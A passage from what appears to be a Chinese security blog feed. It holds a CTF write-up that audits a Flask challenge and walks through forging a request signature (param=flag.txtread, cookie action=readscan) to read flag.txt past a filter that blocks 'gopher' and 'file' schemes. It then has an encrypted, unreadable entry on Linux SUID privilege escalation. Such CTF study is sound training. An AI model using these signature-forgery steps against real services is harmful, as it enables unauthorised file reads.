class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span>(<span class="params">content</span>):</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span>(<span class="params">param</span>):</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写</span></span><br><span class="line"><span class="comment">#若param以gopher或file为前缀，返回True,否者返回False</span></span><br><span class="line"><span class="comment">#回到challenge()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>总结</strong></p>
<p>审计从路由开始，然后在慢慢延申出去</p>
<p>这里有三个路由：</p>
<ul>
<li>/geneSign</li>
<li>/De1ta</li>
<li>/</li>
</ul>
<hr>
<ul>
<li>从/De1ta开始看起，首先是创建了一个Task的类，action、sign的值是由cookie得到，而param的值就是直接通过GET方法传递param参数的值得到，ip就是你的ip地址，接着param参数会经过waf，如果过了waf，则执行这个类的<strong>Exec</strong>。</li>
</ul>
<ul>
<li><p>顺着这个思路，我们追溯到waf这个方法上,通过审计我们知道要绕过waf，param的值不能以 gopher和file开头</p>
</li>
<li><p>接下去执行Task里的Exec方法，通过审计我们发现如果checkSign(self) 为真 ，则可以传递/De1ta页面的param参数进入到scan方法，并的目录下创建一个result.txt ，然后通过scan()函数把参数param的值写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</p>
</li>
<li><p>审计checkSign(self) 函数，发现如果getSign(cookie传入的action, get传入的param)和cookie传入的sign相等则返回True ,否则返回False</p>
</li>
<li><p>审计getSign(),我们发现不知道secert_key的值，但是路由/geneSign有一个return getSign(scan, param)，这里我们另/geneSign页面的参数param的值为<code>flag.txtread</code>(这里为什么后面会讲到)，通过getSign得到的sign值即为md5(secert_key + ‘flag.txtread’ + ‘scan’)</p>
</li>
<li><p>回到Task类的Exec方法<code>if &quot;read&quot; in self.action:</code>如果read在action里面，则我们可以读取读取result.txt的内容赋值给result，这里result.txt的值实际上是我们传入的param的值</p>
</li>
<li><p>在这里就可以解释为什么/geneSign页面我们传入的param的值要为flag.txtread了，因为结合Exec方法，我们要实现写入文件和读出的功能，就必须另//De1ta页面的action为readsacn或scanread,此时的getSign(),返回的值就是hashlib.md5(secert_key + flag.txt + readscan).hexdigest(),而此时只有另/geneSign页面的param参数为flag.txtread才能使</p>
</li>
</ul>
<blockquote>
<p>getSign(self.action, self.param) == getSign(flag.txt+readscan) ,</p>
<p>即md5(secret_key+flag.txtread+scan) == md5(secret_key+flag.txt+readscan)</p>
</blockquote>
<hr>
<p>所以这里总的做法就是在/geneSign页面get  ?param=flag.txtread,获得mds值，而这个值其实是等于/De1ta页面的sign值的</p>
<p><img src="https://img.npfs06.top/20210326205558.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<p>所以第二步就是在/De1ta页面，get ?param=flag.txt   ,cookie  action=readscan  ,sign=我们在/geneSign页面得到的md5值，这样就可以得到flag了</p>
]]></content>
      <categories>
        <category>Write up</category>
      </categories>
  </entry>
  <entry>
    <title>DC-1 LINUX SUID提权</title>
    <url>/2021/08/19/DC-1-LINUX-SUID%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="2350d2130fc1ef0040b6960f2501fbb738ec2896693acc221448445f96f9af4f">017cc0ab8ddab4a1475d3a5d22f989add92f835e3fa861327e848e5a16929e9dbfbc42d628edd088cc5b14e5115e7d27c55f1aa6ac63e69106a130b3b4c1d9831b777eaf45c3af88a161ed33ae49777a37c273aeeaec890d6a4385bd2d797adce7bf20a4e99dad2c031399c7f4c7455abe542f53d13e67aed709764ce4f92e8e987e793cc38db274beb025f9ab575a9d2c39c85d302de0471853439f2fbd2548ce22068bb0e27de1728fb855f8c4e83d2741c73422b9dcaa29fc4bba71c53c0a152065b7e5014320544c0eb970bcfce4990de936f14e495f6c80beee06a605519ce678abc70a1d6ec9109d967fcf2d48bbdc903dacfbf337d7f0f146a1d8ece3d27418f7c578c59c5eadc3ecd795a0bdc005fa86aa5a24a531b74106f88efd1094097a466ae87286ce3f39af1a66414bd71892d29a8593af9d93486d4b6ed6e944bcb5e59427fb4fabf0bb83adb114947d4197f394e2b457feb2945fa49428cf151ac5cb6e5e92bbf0cdde455fad26017fa00fbf9938e0596ce4055a4367a8fc5b7672427670adc1e54d5d5c480d741b1b623e248556e93f107f4525b0608551f2d9ce15c802f1b4dab1b5a420bef90b02efe537148418280781ec15aaab4c0987e2d59a74dda3eec503ff8c0c40a114f1be9569384a5d01ca109795c13739635bec9b97eb5264ae9481b52691492889aff988d70cd904c1ad825e28f2ed5fbd4163fcaaf9a6b6b51926dee23353b394977a4bd519f2a03a195f987ee6bfa43f2dcc0c2881b94eabe9b9fdc26adde8688e8bd646205237a603d29a1fe572d1e54d97dd571363cb88ba883ec6823a0f0109ede24ec34b2819203fcb99e94ac25e284a29d84e8f9a2b328b05fa3693d305a517bbbd8e61f06200127b25bb3b8c47b336e3b630a3fd2bdf560153d6ef018d4aabf0bb319228cfd2d7f836dd837c2ad37d2d6b90044a91ef790873de6867eff6b12baa17089519d06303680feaeacfd4e14453c28dfceb3e6c213cf2053cf52dbbab93847ad8a9ad9f5f168bbca555f37d90972fc512a4120ce1043eb02e08d7ef511fd90083c8b2fb73d44d4636e22563d8bafaff8bb8974e8181c6ba8444c3095c5a34e99901a50442380270364c42d5993a092128012476f091c9d5b7f1a0a346378b17bc420b7847fe95a924c7d8d3a4186594dd376c8374bf8818fa5a25ccc02cb2d143ac87de550d67704b30c357e760c749cd3714e5dd989ea7cb6471f771699b4020ce2c3b9f51f07fbe4e6277520f51c228a45782cc359c34f25559143e3a01e720518301432b30ef69162fc9a274f8c44355adef30f25069dd6dc3d3331989e431e2a60d8d0637d94e5584bf97e0ef2d671007eff07a6a15e3159b8bc06d7e21b575bcefa9b62792dfe957cc4ad7318b3037cf1952c73bb9da4cea97b66a1fac255a3368d31d3d6ca49ac0fa19e48445355938a40ffa66b614e3e8e8fe794e97d35a257b7116e8319b07844f9f8079eddc72bfd2efa76ebbaebb3ce67f76a7672416b67786120004098de5509c7698a2a049ba49264a3687a696ba3fa5b65b6e5bb4aba2e35ca6005523a476a91e49b1b2414629c8c2708aa6c6d5d5556126af0a0d0a3cf2621253fe7f1ae558d3d98dd964abd02781dcfaa777b81ac85f84b3eb6d70a40dbfd2ee439275629f3b0672acc94798cfaec2647975196ed3426b4d53ea92d75f0b26c648de959ff60cdd095935ddc8d5724d0d29820f4849af5d1fe145d6b2c64a6e6c035c99df2f96a3cc289fc5f852c009043063d16f8f8b50f088ea4ec0b418afd87516a96f83932891652e9d1d62c7b7099f43b9010871250d4a614bf3229b5e668ec5be9f1c64f53fdc43ee7e67744aa389e9a6a1aabede0e4751723e2e7d142a410821bc363d70ba93faea6c47f5d6a5c0a4c4399e0e552063cec16b79744ef8b24f8ba31092eee0d3d497b6210b018e1ac40230f81ab7d8632e7843b35502968454e01d287df9982523e488521f6db3613b612354ef7eea7e7b4834ed372645a426fe1fd9367bd7992f5dcb0d1d1e2beaf86973b4ad0bd3a0f0f375c384efdfde855e1aa297da948ff3ac074442cf6d2b59a16907192b7d5d6e8caf5d5ebf5762dbc2aa17372d562ad03fe4b1f6725bea5b4ce893a003266ef489af5186d31e1383e18be2b9099450017868a944739e9272bf0cd4eb18e7344bc45f5a8bca59a18b3bf7d5f72ae914c352abb0f292371302082c6879720988482405d68512df336d934554c057263ba102f5f892f37fc5321d3b0d331d627e03d9f3d6c35daf5906dd05ccecf8452ee2d2f59ec232e29e9cc6bcec9003a74b1b1457b72f083edad0eef0bf54c4322f82e833a3554a2728a3521dc434d634fef2fea523fbe0470840eb2fd7e028ecc406de0e4480efc7fc8dd3d7904e9e276bfe1e25964230d25995403720af36b8eb7e80cb63cdc0b9190cbe8aef30dbb69800b4edaa59960dafb201397d7a83efe91f06dae928f1556d2587e4b378ea29c9c24f0ca89f93b189132e72b2e4e1b87fc535fee2a82bb477689d612c3e63970063614a54d3ad56881aad9b40779a73d11d973d8ce6b531c255854bf222bac9c986f905270fa2120f3d16934fb46e7649753c9a89de977beabc63e7a4a7b2b2b6ab1bdc72fcd798c20276a21cab4c244fa8cde98910d7898be7602043ff5d80209cf95d314739c33500755e39f4129594fb58bf088af75b69b4d508cfebf82b7722f9762be25c658f754ad09df7b559879a1b8aa6b10c47431208c583948bf85d5fd8468829ff03d4d39a207b36388d12bfb68b72ba04b1b7253012a30c2c1a7ffd1edfd6e0ff022de0599ecf6f43be470a7a010b7cd13c8f62bd7949498a7bd29e5cc79d72146e1d4a7b6d88a53abc06f04cb6922f1cb88cfa77096f1d69762ffcbee69ac1d89090a6114205b095ab706f6ca9228f7988d7ab963ee0469d856c03cca6f1fc5c0f6cfbe2388d5ce819db788f2902318c158f6fc20128172a608031e3e762217b85f7b9a785813e3a8bac6821de67f13ac4e49a6af39451f88b27a80b4b47144aa30c729e944cc87059ecae77a7b8df947a7efda46d5572e7cbf3c413848969f2e90780b078462612424ae9b969607c3b887abefd005df0a7cabb711ec1714d3a3e63301f41ce6f25454f6eeb587e0d168c0ab7c780b098fc7c8c904df3f0483f50a12e30cfb84941cac5e21ea356f7cc2f77566f6a8c2dc4bc1a03b1e1117aae6c8fc7d5dc923aa7fdd49aaba7c9d280c8dcab4b67d442c0c120d5d8ccf61d3eb49dc8b4227d0ae9b971e2d2d0a20ae8325bc8702c79267f5f835b02e45f8fff14ebb24c5a070dbd3a15c26ed7dcc5a35c622b43d9628ad27cdf42ba577d070ad538e08d0e19698cffc14e2ffc2e27c8e68fd6f52953ceafc2c101c47d9ebc1da45a0788c264bc8a6544dbe1e7b6edd1171ee3dbf9960d4674980c5fae02f8743a55ad2ab27063244c182668607f9f2431c703d44eb1d4c599c2ab500d1b68718a825c4b7a3e87f89da19487c33c277b0cef0772d6d1acd9d1eb092a0862f98a31971b96c0c974f11c5f3e9a5dc57ddab48bb9c54793967f692c28ee83068bb6af27000f0bf03423f28f76d6b60e3e571dd3d963136ec0cf5c261890499dc0047d2a7b06711f832e2457af6215939630993566a49593cb7938d39e6d1739b8ef12a5de29f64af56a81c7ba506abc06a17f03d217842dea884179cf9bf7e625c7a34104fec1e67d8c99206f026d22bbaf83880e50cd59c58fe4793e6a5fa03ef0efacf60b86ad8d65e54a97499513de414bcc5610da4f1195b0387a826bb73c171e1783267519088599124ee38bccbea4663d92e309919c0906b6b2f14ed980d5458c51f82c98c205420ee0912063a1aaea9be14ef23dd47bfabea2b14bfaf90fe8262cd9f540d1c44f8c6383003d63b1e3453623e5a95e8f8992262da5fe5567c18c86212776fe5ba6c5b98e5b104a3545ff6088422774099ad1399f7efbdf2e4a22584adee0928220fb985166f6703d3bd0a81e918dafcd539401da5398bd3736e9b81ab767ec5bc8ccd5a2a017b766ad621245399f9903a1b13681ee457dddd772bb9cb805983fbd0b96a84cedc930574f488e3fae14c87e457cb943f79f24e939890e4dac1677290c12d0ff9dd7633bb8d8b4daa8c0bc06cd54ec6a0b9971453a0cf3fc69e1506e47c4413b0656ad45035722be1318138b76fa4aaf8c4ebf12514f207ed8934a68ec54729659139372d7350caed0ba5822270242e6ea454fb692f69ab9afeaf45353a685098b16e6a156c61e8fe0e214834592394f336c055b2c7b6e3006c0c045d46280862c5a00906f423967b99afdbc6a8d91c449acab153a0d6240a2bf343c26acaf40c3b451a59470ba778f320309f5a50f525cf21bce873a996617bacee2b6dbfb21877127f0a8177e5b7d5c55a1c0f919b404c7818430ba25decec79c728546f995ea656d97b7c21dec2836e463fd3782b8e69c3007d371bf17b6e4b87d8f70cbe4725dc240084ca2a3212161b7cec4b2b8b840cb8812fcc5f0bc3ea3bb4231f11b935c986ee4329e6e85251f9a348a7c5f73525a7db90cbeadcfdfd89b966f2b90794b41884b386293e84e5c13faf1034df70a13e8039fced56427f2612d72a20dfc35bc74922925836a91272b93e641dac332e2acb5d8c6ef026876f6822f14479f69d5aa2770b73ab09e67ec64627f3a6db809a12e894060948d4e12669634fbb002dd0afc43be622d0d9657cb57d3b5c7afabe21f94f24408e897b89d708860a48057cf48925d9c914a6bb37f3db3bf7e71bf6c409b0d19fbda2510a0a190e32e9d4239e9ced086fee656a27b6971f7ea639378f8ed0387ff900c0bd34ff4e07a3984a0fd2996960d83753c773569d81d0aa2cdd018d59ee404df34bf23b0236cb1a118543d8bc086535792e5fe713dda32e866c04560a9e9a4e8e087c36d9cfaa5182300eb17749a02a242efbbdc4a8df5e2964bd6023741ee36b0aa6c01a9438fb0948cd6629b81d74c873f2018e5342daa3fd2ecff28f3faeb2f8f61ca6a885825974f3f83b2eb691302eaf3404a58061951dee4ed05837e0733a5907d275d0036c583fb0d311b0bd923ae62b44349f442b27cb29ed4e6a2f42333d5e9c2c4e9d8ca8ca4a6697b7553aa433ab5692600493c088422adfca6685b76c3713c8da083a391f4e5e8d92f89132abcf3b43832cb199b21bb43bf2180f60bec645607eb6b1158ac45b945bdf47625bc9d6af0a3b4102bc66cd4cbf5fd07d60fd9c5eb332660d03d91ab235e8bb421246abf24bbe610c0f5c7746b6093ec5b4123cb91c20dcbda812d7bd3f5759ca3daad96d3a27fce5863c45a0476a74e3a538aca589771d5efbd7a6c72f1bea0676514cdef26e5ce1c7a5d5ff12ab449f6d1835e49deffb8caf1ac9fb0d90216c9fcd40cbf57a5fbd07dc1db400137eab68d9910effa30a6b8e160ae1be4bc9146e478cb85a30166cba1559a3cf76a5a4a5525e8d2a97495af9a6eb8d918b344869bfa115aa98c2585dd7b745c259f55faefbd94e21029e30a1b358ab5de16840d4b62ef8af6f9713ef96195e42c1f285dd1e1b45191b098852b92f96fd6d11f6a68b461a43f09ed9b48e249bf01cea24433bdcafa8f90308fd77c3b5b118ff48ef51614ebf66cd8e724e648d98d3ace72dc8d507883c3793e92dad42ae8c2e1f1f140d5216e1ad22871c2c87c86024d914d846b9a0ea9f44a4178c314ec6440105b6bc1344a2bf045451cf625126f601f0eee13820cbed0d11ed366cd8263918c25596aa385d61d68a0f311623dd2a86437a5e7f49bd6f686536db34d95cd0b41b4ba21d2c0933e05908743e1188bbd7b63bd240fd9ebebb2c134ffe8070862d8f1ffa6b0e09e6024021cf68b4e755713f17ac74f4fd08603431026a7de1921c32a00e76b669fde3a1208cf3a85345eb181443f93e439663a7dff831f57321d300b0bdf12583d7bc4b8ca2c938dbb2d8f7502c95a4b5c0ec14fe9fce363e845716d9a620656d5660f9b3b7caf5c0b6efacb67e89bd0c96ff2dde75bbbf421bf7a98a785b11b5f7931e71437bdcc1122272df6abff37607d5c1f65e651c8331d3d0da12f3f3544a9b68ffea7a06e41daaf5f8570a9be79da9011e4d5f0f0c4458f86c55bb15094a564fcc58e521b241e3255e6188185028c25064b61851144a8b6b5ac6d811b2454d5afe0fa75b3c82e9aa81f5bfc47979be8b47c358ef7e76a20ac9acb69a95dc32efa0dc60f63cd66af1b3e7e14b02478ebf84cfdb716e1ffeb09dfdb5da86cdff54acba2bdc6f33fe9ed36de618ef06ef733e41eabdbcc81914ec91f4bdaadb659415b8bd3db145c630086d0e7617d2825173814e43c2a29957de14832f39920b788ac232f8ab5db31ca0a72351dcddc7988b2ddf63ad5b5592ce1270fa328aca201cc4ef6d13b191177881712ecf68f035e8621f4838987bbd49814c314dd10fcd519f297595fc04b751b97357120efb4f9813d0fa89611ebe194c07fe627ca4ddc3939e9de4a532020eb355d16dffc4d4c1be15ab5f0f6ca3d034f792bacde26c41e2092cbf747038382f48ec6cbe5f6816cfa5a574ee67d425d1f2aed86292c8afb94d0a2e9f8f32d163a8232439a8e82409b8836a4ee1dec52f99c143d8c2a3eb0d0553935de0d1a33142fa86928a14f42972448bec7e2fb3aa80532000baedb352760eb970c986b7f47b1670416286b5ce657035d12cd69ca151467924956bc0c44b760c650295471f9aa13017b9677b44b1391156c604c33c1d54701796fadf8ea5ef3557185348381443c3c37927c276c494ea9ad77c37518711b2a669573b13d59d13afd544790c18685d7b2d0f7f50a0f1c58fb8f517c931e98e6d5b16362b52634438ed7fe149acdebf0ab973634a1dbe31735608721de18b657185738c15f16f79fbac1695f78ce385ab7772a1063d3f9adc043903b7a5df8c2c2275deb7302d8d90402490f5c1687c0683ff167d5d8cd929bb7e61750310548c12a6bc67df68e5d7665a102a07c8bdb140550d4a804e867d0595e8606b622e2d329ca7c240884a8232a41962602ff829c669279a53c0e099f1fbc838335b8ac7ccefb91204c4a9c776d6a380f60a70878705031f7f6d1a8f6d3e270fb109e80771736ceef98ee618f26aa1812b2ec43820460f5f3fbab1d2dcf6fe72bef37c67d289fa852b26743b23f8b87d72fec4e639fd421aadd1a0869bac03fe79e65c6b4852964b74d658262119062120211c82be78a3c52b75cfa7e508b58ff2652cd9a5bb5505727c8140b39312118e1b822786d6ff028b8ec3d5817b21de39c4248c90ab77c47069388d962e3b7e27d7bcb1483ff6000e70e7c62845583b71492fd970ee6c677498f3fae0ecd9f9e949132c6cbbad5d2939d60cc702dfec90a1cf64021b3c975882e392965d1dc7e357f1b83e5ad9b0759c92a9e9d52a72adc98a4c5d4540ae57c349efb77d94d2ec804f9cd0de81f36febac00f5bf94571dc5a37c7b67641a00468282bee02a1d6f775ce56536bcb3349b77200f39fb06232605fce9cf09fe554fc4a21aaa4e3d319faaee1d4a6db6a6b1d7028d4303a0bb2c62a8315d222dd99aedf623abc6aa8bbb47929ee881f27f9497d77c119ab39f691be9222fd779eba6cc7fba89ab6b925b44f6faa02d415b8007fdb59cd48ee2e5149c29f84fd02d3f8094443d3f6c72079053037cf4d08c9e6519e71baf476be36609c241ec500af403f6e760947a7920053dd3013339d227d662efcf298fc0883709668a462b8a9be21404ec8f41defb0bb86fb818d96a109d5bbc56def158e6c6c805ec45419b4b29a15bd6759490c7e10b8946c970dbc7ab01c246a9efe7dfea7fcf3d1789b862f139e9fce66684567b49fefe895eebc0bf2cd021fba2a3c76330c72aaa6b7f3dc03af98e8284a32720eb911399f1af40514ea8d5b555876b5ffc5895d89ddad8fc11e7c8d1335ce229b7ffb062e4600b3cb480110021e0df118f5adf80266342554c077765297e6c967300b0792a3d6482b65189d898fabde550c21b73108f6dbe3de30630f803ceab6d5853ec76be34310a271240ecbe34146c3e5230804324b330ff95e8be2a48413ae71a3893d96ed7568cd4cc5a6423cd43a8db5f25c7cbf0865933f0d5ceb078cfe70deff462d6f2135e4bdeaaaf74913a53eacc28862242d621f2ee162a32d887a41f725cec4aa03f51fe494bf3bcd30effc021c41a368f8863a4f193ec9e218582baf4bd3c20c329fb709e86f38cc28e1e2022cb9462afa7ce14a42aaad81c7ef36de3f5fa3cea83369ae2c536de3bb70cc153502b12c227639cf703fd6813c864aa4aa792f6e6895910ba51ff1fe1428d90cd5058c83fc3d1f5cadc4406f391b21c0249b538cf6661f4ae1f4d7943f7782a676b9227967aa026406ee457970384771fddf691fbcadd3b73977eb412853beef2da7b5aa0c90739193cd39738641ee5c86e8da9a6a18b88676722fbbacbf455bed1cbfc61321922751690a3c97331a710ea3a917d3f5c6b1a67f8124d6f116f19141e824b24ab906f43a1ecb976a35aaa02e54081b5f024137bdec096304b364bfd7905a3ae75a62caf90b23abe07a0abe766aace1416791c1b210d2ccc5f1393193b9639358cda73ee28c952fa1d1d7e9f1a784a47bd08543c636234f6771bec2b1ab4ab6c25c01a29f22ac936630c8d10b8a2d3ea8613b4ac077bfa9bafe36eddeb32cf0455c5e1eff0fa4f3d1c0d0aa7d26ac852a2b39499bda5891355a7d34737693bd59737a80d204b884c6a2819d9ee9f85217674f3b680db046a0ecb44d6d33cdbf62785c14283ec36288c0a265f97457af40c0223c6285ea5bda85a00239fe645bb0ffae6fe62919cc66d840c48a6fb7c893d73ae8770cacf2f90a28359593378f42419807f864dfbd0cf8ac0faa4babfde71f2c5a5cdc6c776f03054ddf9df2b784bd2ff37d72b343b4864de9ccb975e641e5121f58042e5afe9293d6da0d22cf7bccc8b05f88c517268f12f588ba33d0a34a41ece53cae1f390cfc2f97f5e4b1f3b148ad90b423304b9573d19709629bdc3d34e7f0291fc7904cabbeebf93685cce85752bffe76e3a15f555c2acdfb66b1965abd04d8a27d5877e5c1cb831bd364ad333f6fad20ce7865dcf8b44071069de3027d488587c00d62e45f6db59d465ce952d79e5d3ccc463b0c4cb54a369a8ac1e40c1470ff63fb8478215a8fc0e16b1af9329e8c287868837d86fcf0e804ffe47cf279b85f1d72708ee5019507d8acf3f0a669a248325f4b30f3726bf4ac203a5ce48ad4d431f564867a7aa0aa23f07553d255edc1c10ea5479e74649069a2c9cdb18cce01cbc8f81bc645533033dca8fc921e49d6d735c03f07e8a24f15f5b8395d731b21e67ecaedfa979fa56e8696f2b20280e902dde5833a995e923eae093dcb926f4e0ea4102fc39be4088b7ade687f7a667e39e6c216d7f733f37b59ba9c6ad7c38b86e4c029ad67ff6d5ee195271103a4d861ed7d7f3fbced3c4c3052157fc7a14499113a128e2bddc022c8c0a66df0a80f3fc7dd18fcc1469fa09ec2f57d9a70f000c9b12ee0751797a18e28114818a07ab2dea15da0e3564c6c6f05f389a155710bcaeccf7e060f8119e9effbc4f73b42ba472e827fc4857877649d0d18b21a6fe51eeb256530ddaeeb1324828dd6869e8fc499e7c2a7b0c47b0668800625d393ee23b72257a554decd6118053121ec88e692830eb02b3fff2aea48c36c1c0e4adf21502414aa40acd215b6f797af50df9c82b4ce183d56d4ea06202290f4650442a79a4e858932c6505058c74b8a119b00ac0ecaa7a8c6e085dead5a961de9281de1e4b389640275779a60e2cd57d7fd7fac04a1b342761dc0f683a5abad7b218a2cea816fc81616800190c334f7c9218a1723ea4b3d6e6bd1112250d9cd5152183181862c2819183be1d6b8f1ea12f76f56bb77b34e33d0419720721101c6dab78dbb92c74d8e14664f9dd995561681c72d32fd67183c97ffbebda561511177bbf395202781866593afcda80fd1bfa607fb85c2b68a14cca6b01b14b6e2222f1e304d1d35d4060529909eda7d7394d5f03095e80649411ff164ca917e1501e29528c08881acc730493d4a229ad2bdc27642bf8350f5f68660a0f34ede2a14dc29d2a6ed4f8c3e967e9bd55fbfc495cf07757ed8658b0f79705947a12939859622e65b41775f33c305d4b568c34a881fcc5d957cdbf99456b9dc5490e2a89b3a7a289a6f2a3c6d936ca31fa867ecd509f73d4307ccf494816cec28467f16633b017644648a4d745f5ecc1e8b23316bbaced7a570beff5274878364405e1befdd5bce68a63188e9834677cfcd15e18e2e5c72eac067175231a7c775140ed3a7daa6b68f36b9f0ec1a07921fd631fb919307f3a2482b8d0834722dc60932717f96f67e1b5a83543626478a95d8ddae20410c66dbf0b21b3525d6ee7ae23f5c5f68f0e6d25028349da67b52d3de7f3c0eeb59e5e219ac3eedcc5434b00d39c2c908094bd09ca2483854e95e36c879e10e9810486f2d33acd358a47afbc3e50e41fbbfd433d8c402ec7a8de8122e6b10f9f3ff5cf9dba45116a581b92cce5456375a41cfe49f55bfcdb8eabfe58e7b04917c69c1ff88b2adeefdda3237a9398c5642b0e8bbab9a2a89880a6e3182b5e398e3c6978a7186cb92c0ff7bd533fcbb71b1f11090da6e160e81924400a9ebf2ae04f0079e54b9f5bd449bd2010f7c315c0e22f6266908c5a314bfb99205011f030e83af3298494606dbc3da43dd84599c5805775bf269cb6cb333f213836e1813a3692613850caf880eb2d57445e23e294438804abcd4797170550b11e9fae849ba8848bb0625859661f30fc6f2f077a7611e6b16e1e33701b286cbef0c0d691c072a181317e58445beaa2a214d0a57123cb6c5af1523c56f5d85f971c48ae74274713e6aa45b37696af112d0725391550eb73f6bf7dd85746cf0e88cf7585b81b79dfdde19f7b121bf1dbf1691b81d7b04cafd6ffcfeb32a300428761d3d2d28b74d71230cc3dc67bac409f0ed9e7bff394dc8d2f539b6a19afa97c4879171d893decc1e0485d911787662d913031a96360e58311465e10d3d32a15e3c17e8f0c00daf5e805448f2e7203b1d9f141d3aa07b798a6b8a53475a6a000721833e60d450efed79a43f1fb9a1a18b2cda9ded22aa752510c41994b6820f611d6c6d10ba56373cd8213af554af8b8bb0dc1e3cb1f8a93ff98a05196708942316074cebc1bda2a04a5397f6dd3f432993d9c4e70d1276b393b406722155cdbe51981480a65af0db96f61ce570869104d78bd909d276479a4e4451f806379f4077166580eee7a41631260be56d08b630348fc4b5272a78824846f1dbe60fd46c051db0ed894867d59e31bb80c32f71df7bf767d657fc75859cebddcba7acf8a42a703aba04ccc5e38b7e59b29622dfe2935f3a30c10a3686744e47436d743efbe7dcd9441e1ea374831a0b77a7f544ffc9e4a1ef1500f67cb6fc129915a7bcb560ce38d27c4cffe377809b9d1b086579076260d016f36aa7d930c4a35cda08f5267d81f290bbeae170f2b19114725cb109f12a2e20e06eb9699da06b77241239d60854e9b071c8f2d3d32d43a0e705a9322f29216d6466202885fe5f2a7b71579a8e18d4dcbb8aed0ded357ba095b2866acc73d07ccf5991a6e1ec03db5e16e50749f19a4ab5c2d466f1b24434d00021e6257c3d35b998999f9a363d7bc13dcd4d3de61f7f00d72fcbd7a919a96b374fbb229b37a7513a06fe03bdd8c9d436b9c8d4e7f91952b97c3c88b9a4d24abe9f6414a6546adcc4c432b3e3491c60ece266ff56b290ff7847e0aa1dcf6019b4f3c23822920cc7726babfe9689599c90d36e3b65497e92a1f41fdce764cb4b9684dc36adb96663c37895ce64af1480c092c68b8b40bd32124379cdde6a14ca6c8300c66f7cf0a9dd1065369b4cf05ceab241f1246dc2f8ebbdea4e24a4bd03e7be828beae703a8b4786f8e885e77b82e36b6e6913c554372c372fa369f86b88d96301663552c43512a77e0317c456762b8501183d69e58cd3db975fa57aad13431ae63c9a9176b92e674b03eea123dca93c70c4728f332751c0bd3aa44fd276481f63df4bbebd335c2cbee1b202a975fb5ba70433635a1784f5b2ed58d029db559d1dce65b01b48f55dc083fcc5a31a337b4a3ded0a2b635568ec5e66865ea5757744d8b802a89b02fdaf24fd9c7dec8689f53646c4ddcd27227bd60d5fc29427f7a7bea0019fc1fb5ba2e477afb8e794ba9b51e11d841819ec22387ffad91847e71dbb35d5f0d244d3a3e9aee92f789d232b0ac3cce1782065bec1ede23ade96cc6946d86889b7fd87b483e363ea9346090d4f7de2a5838daa05a0750e6301b4efe41102ad03e206850a1c212f513ac793ee2d618b6940ad426e3f8ce04cc771efd62479a7eda40bcc70475a428b2c6110c64aec0c2ba9a0815383a0253dcef054dd67c6fdc7be6727c41fcaf703fe943a7d6a501f586668a0d042a0e55426ba5b2c030c5dd3db3a2eecb251715e89b9c764f7e672251fde154c9fa8c91638217ce2e6cf4886e2e0991c456e6531e5eb241b2afae852a39c0800a8e990f257771c0517aef44ebf30df2d6a06140ab3904fc286093965288059a60dfd5034f8a37062c8fa579f37394d0c5da6b02447c162b018a486a3c5aaa89db78c283984faccba6518d135387a9302c1542fff41f502cb6296da4147554b145e98565eff7626ff860deb06e491c4b9158161f7703a329cfebdb55dea62f532020c9bfe5bb47d0e61e158e20c5dde0c65abcdecd7d5443bd4dabea5ae27539ca1fdf4e1952a852f627de13db61974e9c3ab69145516adc69eb70e5feee970fd33ceecca819a632b15de5be0a40dad20de138ca9b4e228cbec15d2ee9d5aa8fca52a2c380dddf8552fcea18686f5c8ba6c80e54b2523ae2c43d61a24227c52e1b767a73f16a8a7638285e761941161fbf3e4f72013e13e5f239d863fc6448c4b41fca5d15bc070f5eeaecef3648e755f07b5c40563290c3149a7193a9129deeebd4ca4ceb0710079d62e7ffc147dec66d6c19a4b97835ed54d42cc4b32d7082a42414c2e770f219c1bb5fca42f35d436b85f3f07e01b72111b12c2e5df42f2aaa01537439ccaef87dbc98078c6c73b0a43d10d58f379efa60a853fe31d9c63a5debd8a1507bdf710c2cb568528d8009e79134a6257ac03d6d982db064e8abc2d472232acefe28c4946640fe7f5e9ffe233da3c9f2e80115f43ca8205769384ce8e3c40ffb100fb9f93aecd8699f2fbcf5dcd19b9d3c6e5591eb0a2af56b8ef9df50bb33d95bbf6707c4c7334417057257f8e9b7ea81700c8611533649b50230b7db661f60f5c2d60b41954c61cf497e5a0655d95bef3b5572e19f5b832ed967121f6515507edab8d56a77dff972654c192fecb8bbbcf91b006381a7f976a6a87e4a1769204b51852561fc6d65891256aa7ed71c54983cc02b677b6e22a32a65a27d184362b5836df29a7d0f5c22b0f33908a99f8925e004f0e0f82e2fe5fb8a4446873f0a6119f75c01b1b0a2dd95613b76bc842ac399c254a32e346699f714650a06f9fff1ac2f9df4446270fbb8d9b92ff5ffb7dd1c02acf275628e4973d187fd0d2e0610645e114de2208108eb3d68ce2b0107fc63fd8d8226fc595fc733b3e1f7bfd832b97efadd4587f5cda44452ed8fac6682